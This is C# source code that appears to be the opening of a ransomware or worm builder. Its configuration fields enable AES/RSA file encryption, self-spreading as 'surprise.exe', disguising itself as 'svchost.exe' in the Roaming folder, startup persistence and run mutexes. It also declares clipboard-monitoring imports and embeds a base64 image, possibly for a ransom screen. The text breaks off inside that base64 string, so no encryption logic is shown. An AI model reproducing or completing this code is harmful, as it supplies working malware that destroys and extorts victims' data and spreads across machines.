using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEBLAEsAAD/4QBWRXhpZgAATU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAAITAAMAAAABAAEAAAAAAAAAAAEsAAAAAQAAASwAAAAB/+0ALFBob3Rvc2hvcCAzLjAAOEJJTQQEAAAAAAAPHAFaAAMbJUccAQAAAgAEAP/hDIFodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw/eHBhY2tldCBiZWdpbj0n77u/JyBpZD0nVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkJz8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0nYWRvYmU6bnM6bWV0YS8nIHg6eG1wdGs9J0ltYWdlOjpFeGlmVG9vbCAxMS44OCc+CjxyZGY6UkRGIHhtbG5zOnJkZj0naHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyc+CgogPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9JycKICB4bWxuczp0aWZmPSdodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyc+CiAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICA8dGlmZjpYUmVzb2x1dGlvbj4zMDAvMTwvdGlmZjpYUmVzb2x1dGlvbj4KICA8dGlmZjpZUmVzb2x1dGlvbj4zMDAvMTwvdGlmZjpZUmVzb2x1dGlvbj4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6eG1wTU09J2h0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8nPgogIDx4bXBNTTpEb2N1bWVudElEPmFkb2JlOmRvY2lkOnN0b2NrOjAxY2ZiZTgxLTRjOTQtNDk1OS04MWY1LTI2Njc3ZGFkMGVmYzwveG1wTU06RG9jdW1lbnRJRD4KICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOjZlMmY3NWQzLTY3NDktNDBhNi1iNzUzLTAwYzZmODk5OGQwMzwveG1wTU06SW5zdGFuY2VJRD4KIDwvcmRmOkRlc2NyaXB0aW9uPgo8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8P3hwYWNrZXQgZW5kPSd3Jz8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgBaAMqAwERAAIRAQMRAf/EABwAAAIDAQEBAQAAAAAAAAAAAAABAgQFAwYHCP/EAEgQAAEEAQIDBAcEBwYFBAIDAAEAAgMEEQUhEjFBBhNRYRQiMnGBkaEjQlJiFTNygrHB0QckQ1NjkjRzorLwFiVE4ZPSVKPC/8QAGgEAAwEBAQEAAAAAAAAAAAAAAAECAwQFBv/EADwRAAIBAgQCCAYCAgICAgEFAAABAgMRBBIhMUFREyJhcYGhsfAFMpHB0eEUQiNSYvEzchUksoKSosLS/9oADAMBAAIRAxEAPwD8arqJBAAgAQAwgBoECABAAgAQAx1QgGmAIJBADHJAAE0IkmAxyQSCaAEAMJoRIJiGEwJBCENUABNEjTExjkmgJBUIkE0SSaqExqkIkmAIARSAR5JARKkZEqSkIoGiJUjEkNCUggSKIpMBFIaEUgIlIaEkMRQNAkMEwBAAgAQAIAEACABAAgAQAIAEgBFwBIAQAJ2AEWAEWAEWAEwBICxFWLqE1snDGPawfmccn6AZWkad4OfBEOdpKJXWdiwRYC3o9CbUtSr0Ydn2JWxtPhk4z8Bv8FpRpOrNQXEzqVFTg5PgaXaS7BY1izNXGIGkRVx+GJg4Gf8AS0H4ldWJnHpG1tsu5aGNCDUEnvx73uYsjy8krjbudCViCRRON5amnYVjR01rrTiMhjGjL3u5NHmuuhF1H2czCo8iNyz2gkb2ePZ/TmiGk53FO4D153eLj4eXgu2pi10XQ0laPqcUMEnX6eprLh2GJBpwma6eV3dV2H1n45n8IHUrihhsycpaRR2SrZdFqyvckfMBHGzuq7PYZ/M+JWdRyn1Yq0V7+pcEo6vVktIrh+pRB+7GHvH+5u6eHpp1Unw1+gqs7QdipZldPYkmdze4uPxWE555OXM1hHLFI5qSgQAIAEACALOms4rHEeTBla0FeV+RnUdlY4zP45XP8TlRJ3bZUVZEApGNCENNMBhNCJBMQ00IY5JgdIopJPZYT5rSNOUtkQ5JHUQMZ+tlA8huVqqUY/MyczeyD+7eEvzR/i7RXmZC847wQAIAEAMIBjQIEACABAAgBjkmgGgAQSAQA0AMKhDQIaBAmAIAkOSpCGECGEwJBNCGmIYTQhpiGqQEgmSMKkSTHJUhDCaAaYAgCKQCKkaIqRoikMSTGRUjQFIYkhoRSGJSAkDIpARUlAgEJBQJIATAEACABAAgAQAIAEACABK4AkAIAEwBFgBMAQAIAEACBAgAHmgZpavmtWracPaib3sw/wBR4Bx8G4HzXViOpGNLlq+9/g56PWcqnPRdyM1cp0HSGIvKcY3Jbsei7P8ADp+n6nq/J8EPo8B/1pstB+DBIfgF6GHtShOpy0Xe/wBHJW/ySjT5u/gv3Y87gyOwBt0XBrJnXsi1HXaGb81qqasZuRwmgLSSFnKFi4yuSqVHTFz3uEcLPbkPIeXmfJOlScrt6JbsUqmXRbjtWg5ggrtMddpyG9XHxd4lVUq3WWGkfeoQp260tyxpzGiM2bbiyuDgAe1IfBv9ei1oRSWept69xnUeuWO5bksuuOaS0RxMGI428mj/AM69V1Z3WeuiWyMVFU9txPiaQcBaOCsJSdzS7O9nrd3SNV1NhbFXhaI3zPOA0c3Y8TgYRhsJKdOpUvZbfkwxGMhSqQpPd8DyTwA84zjO2V473PVQkhggAQAIA6VYJbMzYYWFz3ch/Ek9APFVCEpu0dyZSUVdlqzLDXgNSq4SE/rZx978rfy+fM+5aynGEckNeb/HZ6kRi5PNL6fnt9CiudGoJgMIJBAEh5KkI7RQSv3aw48TsFpGlKXAhySOvcws/WzA+TN1oqcI/MyczeyJNkY04hgBPi7cqoyS+SJLX+zOwgtzNy8lrfPYLoVGtNXexHSQjsHoobyPEUfx8pPSXDg/IjL2Bcwl5B6YIAEACAJDkgQIAEACABAAgBpgNAgQIAgBpgMckxDCBDQhAmA0wGEySSEAwmhEk0AKiRhNAMJoQwqQiQTRJJqpCJJoQwqQDQAikAkgIlIYioGiJQUiJUsYkhoSkECRRFIBFIaEUgIlIaEkMSBgkMEwBAAgAQAIAEACABAAgASAEgBOwAmAIAECDCAuPCAuCBAgAQAIAvaJDHLeD5hmCBpml82t3x8TgfFdGFgpVLy2Wr8DKtJxhZbvReJVszPsWJZ5Tl8jy53vJWM5ucnJ7s0jFRSiuA4Yi88tk4wbBysd3vbEzDea0bUVZEJXLelXA6s+hY/4eSTvDnlxYxk/Ba4eqmujlszOpCzzx3R2vaYKkZmgPeR8/MLWrhuiWaOpNOtndmZ0VjJwVyxnzNnE06FMWIZbMruCrBw94/HU5w0eJOD8iV10KKmnKTtFGFSplait2VdSf34DImd1Az2Ix/E+J81nXl0mkVZLgaUll1erOel0Y5G2rdrPo1SMPcBze4nDGDwyfoCsaNFO857Lz5IqpUatGO793OE0slqTvJcAAYY1ow1o8APBDlKq80gVoKyJxvLVrGViGrlhtgcB3W3TdUlQ1NXUrc8WhU9JErhC4ekSsHVzuWfcB9VvXqShQjST7X4mFKlF1pVba7GDLACMheZKB2qRVfGWlYuNjRMgkMEDO1OrLal4IwNhxOc44axo5ucegV06cpuy/wCu8iU1FXZYs2YooXVKXF3R/WykYdN/Rvg34nyudSMY5Ke3F8/12CjBt5pb+nvmUVgaAgAAJ5JoR3iqzPHFwcLfF2wWkaM2Q5pHQRV4/wBZMXn8LB/NWoQj8z+gs0nsibJN8V64HgSMlXGX+kSGv9mdxUtSjinfwN/McLZYerPWbsjPpILSKJNhpxe090p8G7BXGnRhu7slznLsJtsFu0ETI/MDJ+a0VZrSCsTk/wBmRc+Unie4k+alym3dsaS2RJk34vmrjV5icTpxt/EFpniTlZ5peAesCABADQA0CBAAgAQAIAAhASTAECBAhhAAmhEkwGECBNCBADCaAkEyRhMCQQhDVIACZI0xMkOSpAMJkkgqQibU0IYVCGmAIAikAipGiKQxKRkUhkVI0IpDBIaEVIxJAiJSGIpXGiKQxFA0CQwTAEACABAAgAQAIAEACQAkAJgCYAgAwgVx4QK4IAEAPCADCLAGEWFceE7BcAEWGjSx6LoQH+Ldfn3RMO3zd/2rr/8AHh+2T8l+WYfPV7I+r/RShhLjnkFzwhc0lI7SPbG3harbUVZEpXODGOlcs1FyZd7FglkLNua10iiFeTNXs65407Vb1j14K1fgiaeRnkPDH8hxu/dW9CUlCcnsl5sxrRi5Rit2/Jas87jBwuC1jrPQapMaGiaZpfJ72m9YH5pBiMH3RgH99d059HTjT8X47eRy049JUnPwXhv5+hQje142KiMkzRqxrXohB2dp1OUlyQ2pP2RlkY/73fELsqU7UIw4y1/BzQk5VpS5afd/Yx5YCwbLCVNxNlK5xxhZFDgidYuQ1283vA+qlRc5qC4lXyxcjtqd3vtSme32A7hZ+yNh/BOvXzVG+AqVPLBII5A8JKSY2rA6MOCbVwTsVpYCNwsZQsWpDpUpLDnkubFDGMyyu9lg8/E+AG5RTpSn2JbsJVFHvJ3LbDF6JUa6KsCDv7UjvxPP8ByH1TqVE1kht69rCFN3zS39O4pLE0LEdOZw4nNEbfF5wto0JvXYzdRIkI6kftyOlPgwYHzTy047u4rzexapxWrPEKNMAN5uxnHxW9GFWrfoomc5Qh88gfRnLibc4Zj8Tv5KpYWd/wDI7CVaP9ENrKUPJr5j/tCajRh2kt1Jb6EvSZccMLGxD8oVqtPaKsLIuLIhkjzl7iT5lJU5S3DMlsdGxNHPdaxpRRDkzo0AcgtkkiGxloKLJiTObo1nKmWpEOArPIysxgrxz0wQAIAYQA0CBAAgAQAIAYQgGmAIJBADQAwmhDTAYQSCaAEASHJUhDHJAiQTBjCaENUhMY5IQhhUhDTQiQVIRIJokkqQhhUgGgBFACUgRKQyJUjQikUiJUjEkNCUgCRRFSAkDIpAJSUIoBCQUCABAAgAQAIAEACABAAkAJACdgBMAAQK4wgQIAYCAHhOwgwgB4QIMIAEANAXOtOvJatRV4h68rgxvvKulB1JqMd2TOahFyfAvakWWNQd3X/DwgRQ/sN2B+O5+K6q9qlR22Wi7kY0rxhru9X4laWQMbwsWUpJKyNEr6nKKN0jslZxi5FOVjs5zYm4HNaNqKsiUrnKON0rsnkojFzZV8qPSakxtHs7pumN2ksZv2PH1vViHwYC799elOKp0Y0+er+xyweepKfLRfczdI0pupaxWpl3DHJIO9d+GMbvd8GglctLDqrNR924mtSs6UHL3fgU9fuO1HWLV8t4WzSFzG/hZya34NAC58RJzqOXP2jWjDJBQ5HHTIZbd6CpD+smkbG3yJOMpUYuc1FcR1JKEXJ8DZ1S9Fc1md8P/DxkRQf8tg4W/MDPxXpSrKpWbWy0XgcdOm6dJJ77vvZAtDgtbJivYrT1+ZC550uKNIzIaU0wvt3XD9REeH9p2w/msKHVcqnJeZpU1ShzMo81xHSSY8tKadhNXLcM4OxW0Z8yHE0qNQWGPnmk7mrGcSSkZ3/C0dXHw+JwF1UqWdZpO0V70MJzy6Lc46lKLDGwwR9zWjyY4gc79XOP3nHx+AwFFaSn1YqyRdJZdXq/fkZb4XcWACSTgABcbizfMXQxmme21sl7ow7tg946v8uQ678uhJUN9Zen79DO/Sf+vr+vUrOa+Ul80jnuO5JOVFnLWT1GmlokSaxo5BNRQrmtDq92HTzSpnuI3e0Wj1j8V6MMZWhT6OnojjeHpynnnqURE5xJc7J81zKk3qzbOlsTbG0ea0VNIhyZ0AA5BaKyJuNUmIYTQDCtCDja3mUnNIFFsiZm9BlZusuA1TZDvT4BT0r5FZDAXinqAgAQAwgGNAgQAIAEACAGOSaAaBAgQBADQAwqEMIENAgTAEwJBMkkhAMJoRJUgBMkaaAYTQiQVCJBNEkmqkIaoRJMAQAkgIlSCIpFCUjIpMoipBCKQwSKEVICKQ0RKQESkNCSGJAwSGCYAgAQAIAEACABAAkAJACoAQAwECuCBDAQA8J2FceEAThikleGRMLnHoAqhBzdoomUlFXZEggkHYhJpodwwiwh4RYAwnYADUWA2tCh9HqWtSdsWN7mE/neCCfg3PzC9HCU8kJVXw0Xe/wjkryzSVNd77l+zPmkDRwMXLOVtEbpEIITK8Z5E81NOnnY5Ssj139ordB0yxW0XQonl9NnDbsPO8kpAyPIDkvU+I9DRtSprbc8v4Z/JqqVau/m2XJfs8jFE6R3E7kvLjBy3PUcrGjo1Majq1XTWO4BNIGyP/Azm93waCfgt6Uc01BGc5ZIuXI561qv6R1q1daOCKWT7Jn4IwOFjfg0NCirX6So5cPsVTpdHBR5e2aujOFbQNS1Lk+YCjAfN44pCPcwY/fXbQajSlU56fk56qzVIw5avw28zFliD8nG64pQTOlSsWtDidThv6ryNaHu4T/qyZaPk3iPwV0IdGp1eS072Z1pZ3GnzevctfwZlcFjdljT6qNZ6stwT42K66dXmYuBYc8GMkLWUllJjHU6W4RFoETMYfalMh/ZbsPrlRUgo4dLjJ38Bwles3yMGWFzTyXluLR2JnLCksv0KbDCbtx7oqgOBw+3K78LM/U8h9FtSpq2eb6vr2L3oZTnrljq/e47GpSWHtHC2KGMYiiZ7MY8vE+JO5VSxDn2JbLkKNJRXb6nStxTvbHE1z3vIDWtGST4AK4dd2WrJl1Vdmi7u6GY4HNku8nSt3bD5MPV3i7pyHiuuypaR1lz5d3b2mGtTV6R5c+8zxTPNoyepWKwz4Gjq8xejlvtKv47W5PSkmsaOi0VNInMyStIQwkAIQDBAG5TFYiZWjqpdSKGotkO/wDALN1uRSgR7xx5lQ6kmUopCylcBpgCdwMVeWegCABAEhyQIEACABAAgAQBJMAQJggQNQA00BIckxDCBAmhAgBhNASCZIwmgJBAhqkIAmIaYmSHJUgGEySQVIRMKkSMJoBpgI8kAJSBEpDQjyUjREpFIiVIxJDQlI0JIYlICQMikMipGBQNCSGCYAgAQAIAEACABAAkAJACoAQIaBDQAAIsK5IBMAQK4wMpiL2jahNplr0mBrS/GBxDIC6sJiZYaeeKMa9GNaOWR2v147MT9SqD1CczRdYnE/8AaTyWlamqidan4rl+iac3B9HLw7f2Z2Fx2NwwnYQw0lCQFmvBtxP5Bbwp8WZylyNLXpPRoa2ls2MDOOXH+Y/cj4DA+a68ZLJGNFcN+9nPh1mcqj47dyMuCAvPE7kuKFO+p0uVjZ7ONhbqXpUzQ6vRjdalB5O4PZb8Xlo+JXbhrKebhHV++85q93DKt5afX9GURLZsSWbLi6SRxe9x6uJyT8yuXK5ycpHRdRWWOwSPx6jESlbRAlzNrQa/oWg6nqj9pZmihXPnIMyke6MY/fC68PTyUpVHu9F9zCrPNOMFstX4beZg2K/CS4cvJcM6fI6Yy4Gt2mEumQ6bozmOY6tXEswIx9tL6zvk3gb8Ct8TmoqNJ8FfxZjh3GrmqLi/JaflmdDKHjCyjJM1asbWpMEGh6fQ5Pnzcl/e9WMf7QT+8u+pDLShT56v7HJTlmqyny0X38zImr8PshYTo22N1Mqu9XmuZ9Xc0SuXKbI4oW3tQ4u4d+phBw+fHn91ni7ryHlcGks9Tbguf67foTK7bhDfi+X77PqFi/JemM0zm5wGta0Yaxo2DWjoAidd1XdjhSVNWRycwOCnLcpOx1i06KGBt68Hdy79TC04dP8AHozxd8Bvyaw6jHPPbguf67foLpW3kjvz5fvs+pnX7M9ubvJiBwjhYxow1jRya0dB/wCc1y1Jym7s3hFQVkc6teazO2GCMvkcdgP/ADYefRKEHN5YrUcpKKuzQ9IZSY6tReJJXAtmst6jq1ng3xdzPkOfSqipdWm9eL+y/PExcXPWe3L8+9DpSII4evUrpw6voZVGacQaG4C9SEUlocbd9yMkIcDsiUExqVinLCW5XLKm0axlc4nbnssm0ty0rkDK0ct1k6sUUoNnMzOPLZZOs+BSgiPETzKzcmy0khIQwGyYiSYhoRJIclSAEwMVeYegCABAEkCBAAgAQAIAAhASTAECBAhjkgATQiSYDHJBIJoAQAxyVITJBAht6pgyQTQhpoTGFSEMJiGE0IkFSESaqRJJNCGFSAaAEkAjySBESpYyJUlEUmNCUjEUhiSGhFSMRSBESkMiUhoSQxIGCSGCYAgAQAIAEACABIASAFQAECGgQwEAMDwTEMBAhgE8gmk2K51ZCTzWsaTZDmkdWQgea2jSSIcyfA3hIwFeRWIUmdIs19OlcCQbH2fvaDk/VEf8dJ/8tPAb6012FQNXNY1uNrc7YTSFctQQBo4nLeFO2rM5SuXdJDJbwfIP7vWaZ5fMN3A+JwPiujDpSqXe0dX4GNZtQst3oVC2SzPJYnOXyOL3HzJyVhldSTnLiapqKyoUsgA4GIlLggS5muyH0Pss0O2l1KXvHf8AJiJDfm/J/cC6o08mH13l6L9mDnnraf19X+F6mRI8n1GLklK+iN482SjjbE0veU1FRV2NtvRGz2jmFSPT9F9l1SDvLA/15cPcPg3gb8CumvUyZaXL1ZhRjmzVOe3ctBdl9Qq6XrlbUrVJl6Ou7jbA/wBlzhyz5Z3Tw1SNOam1exGLoyrUZU4ytfiV+2Op2+0eu2tYuhgmndnhY3DWgbABYYuTrzc2XgqEMLRVKGyMnSqctzVK9Jh4TNIGE+A6n4DJXNRpudRQXE6qlRQg5vgaOoajHe1izZb6sJdwwjwjb6rR8gF2/wAhVKrlw4HPCk6dNR48e/iRdKwjbdW6sQUGTdShqxNuX4xI944oKp+8Oj3+DPAc3eQ3Wc6Sis9TwX3fZ6jjUcnkg+9/jt9DEvSz2bD57Dy+R3M8uXIAdAOgXnVZSnJuW52QUYq0djixxaVmnYu1zcpthpQMtaiwPke0OgqnbiHR7+oZ4Dm7yG59CllprNUWvBfd9nqcs7zbjDxf2Xb6HK1YltzvnnkL5Hcz5dAB0A6AclM6jqNykyowUFZHODT5Lk3dwhuQOJznHDWNHNzj0AURw7qO0RuqoK7FaeyGF1KhnunbTTkYdN5Y+6z8vXmfAKdop06e3F8/0OOrzT34Ll+yvBD0HxKKdK4pTsWmAMG2y7YrLsYPU7x2Qzm5axxCjuQ6bZ3baa4eqtViU9ieifET3lwUSqORSgkVJoSdwuSdNs2jIqvjLc5C53Fo0TIYUjAJANNACYEhyTJGExEgmhAncDFXmnoAgBhADQIEACABAAgBhCAaYAgkEANADCaENMBoJBMAQBIKhEkCGOSYhhNANMQwqQhhNCJBUJkgmiSTQqENUIkmAIASQESpBEUiiJ5KRiPJSURSBCUjBJlEVICQNEUhkVIwKBoSQwTAEACABAAgAQAJACQAmAJiGECG0E8ghILnZkLiN8NHmtY02Q5EmiFnM8RVJQjuTeTLTq8Vmo6xVbiSIZni8vxt8vEdOfJaulGrDPDdbr7r7kKbjLLLjs/sVoCAcELOlK2jHNFkBdSRjcYCpIQcLnubG0es44CUk31VxGtNR6g4GbumbsiHA34c/qoxDTllWy0KprS74mp2TGmxG5d1OB07YIx3MfR7ycAH+K6sBCklOpVV0tjlxjqyywpO13r3FSKqOJ0jgGgkkDwRDDXbk9DR1eASgHIHJOcUKMmXY4PRtDHFtJdfxHyiYdvm7J+CuNPo6Gu8vRfszc89Xsj6v9GdM/7jFyzlwRvFHXTaL7FmKFuO8me2NmdtycD+KqjQzSSYp1MsWzQ7Wy95rc1WBrmwVMVYQRj1Ixwg/E5d8VvjZOVVwS0WhjhVampPd6vxM1rGwty7crnUFBam97lvszXjva7D6S0uqVw6zZGOcUY4nD44DfiihHpamuy1fgKrLo6btu9F3sytQtTXb092w7M1iV0sh/M4kn+K5ak3OTk+JvGKjFRWyCvNjYpwnYTVy5EDK4NYC5ziAABkk+GF0wWbRGbeXVmhLGzSY5WMIdqUkbo3EHIrNcMOAPV5Gx/CCevLedNUE0vnfl+/QxjJ1nf+vr+vU83Ix0buWAF5Li0zvTubFcx6QwPuMbLeIBjrvGWw+DpB1Pgz4nwXbTksOrz1ly5dr/BzSTrO0dI8+fd+focJZ5LMr5pZHSSPPE57jkk+JUyqObu9zSMVFWRwlha4HkspQuWpWLDqkejtEtqJst4jijrvGWw+DpB1d1DPi7wLlSWH1lrLly7X+PqSputpHbnz7vz9DInllmnfNNI+SV7uJ73HJJ81ySlKUm3udCioqyNjQdH1HUa8tuOPu6MO81mTaNg9/U+Q3XbhcLVrJy2iuL2OTEYmlSkoN9Z7LidZbUcsPodJro6gOXF3tzOH3nfybyHmd1v0imslPSPr2v8AAlBxeaW/p3EBEwjBGy0jTjbUTkzjM0t2Y3ZRN5flQ4q+5Uc5xOCVyucmaqKIqNRlypTuSMdKyJzYm7ukf6rR8SuqlQqyTklpzM51YJ2b1HFOM4JBRGpwE4ncEEbLZO5JB8TXBTKCY07FWWEtyQuaVOxopHEghZWKEmhggBhNCGEySQQIaYGKvOPQBADCAGgQIAEACABADHJNANAAgkAgBoAYVCGECGhCBMAQBIKiSSEAwmIkqQAEyRpgSHJNCGFRJIKkIm1UhMYTQhpgB5IAipAiUhoRUsaIlIpESpGJSNCSGhFSMSQIieSQyJSGhJDEgYJIYJgCABAAgAQAIAFIAmgAbpiOjI3HyVKDZOZEwyNvtHKrLFbiu2MSgbMaAnntsLLzIlzncyVLk2FkgASSA7VZpa07J4XlkjDkH/zotac5U5KUdyZRUk0y9crRWKx1CkzhjBAnhH+C48iPyHoenLwXTVpxnHpae3Fcv0zGE3F5J+D5/sr1ySMHolRbejCasdw1dCRlc6VfsxNaP+GOFn7RTg7ZqnL1B62jzKjWlx8SuRRbZrexturitSgrO2c77aT3n2R8v4r11SVOnGD739jiz55OXgcJXF54RyRKTlogWh3p0X2J4oG+3K8NHlnqqjQcmo8yXUUU5ciOvW2Wb721toIwIoR+Ruw+fP4rnxdXPNqOy0ReHg4QvLd6srQQBg43rOFKyuzRz5AXyOkHdkt4TkEbYSu2+qGltT0cMtTWK7a91zIdSaMRTnYS+TvNelFwrRtPSXM4mpUXmhrHlyPMahBYhtyVp2FkjDhzV5NaElJxkd9OcXHMmer7NdoIdD7G6nplTTIXalqWY5bsgyY4jj1Wjp/Vehh5dDQaS1Z5mKwssRiYVJS6sdUu3mzxcsJYTsvIlTcWexGaZGCvLPOyGCN0kjzhrWjJJUxg5vLFaspyUVdvQ2qXHSmFHTcWdRflsk7DlsQ6tYeX7T+nTxPfSfRPo6Wsnx5d33ZyzSqLPU0iuHPv+yO9iaiyg3TaMTbNh0gM1sZJeekcY/DnrzcfJaynTydFDV8X+CIRnn6SbsraL7vt9BSRx6SDsyTUx7nNqn+DpPo3zPKZQjQXOfp+ylJ1v/X1/Xr3HnLUT+Nz3EuJOSScknxJXlTg73Z3RktjnFIWHfkpjJopq56GCSPS68UrQH6jK0PYSMtrtPI46vPMdG+Z5enFqhFP+z8v36HG06ra/r6/r1K+mVItQ1FkVmV7I3EuleBxOxzJ36+9RQoqvUtJ95VWo6VNuK1MvUIIvSJDXY5sXEeAE5OPNcNenHO8i0OqlJ5etuXxq+tX9Kj0KuXilH6xiibsfNxW8a+IrQVCC07Dn/jUKVR15fNzYoaQr/8AFW4YcfcaeN3yC3hQVP55JebE6jl8quaNOxpwa5kFSe3ORhhk9kHx4R/NdtGpR1UIuTOecKnGVkB06bHFZdFWB/zXAH5DdH8WT1nZd4+mj/XUrzVtOjBJfNZd4NHA35ndZTo0I8W/I0jOo+wpvtviOK1aGAeIbxO+ZXM6zh8kUvM0VPN8zucDJatO4S6aY+G7ljmq1dLtmloQ7Do2hO3eV0cHk9w4vkN1aw018zSJ6WL21JFskXXib4p2lANJHSOQOHMLSM1Ilqxa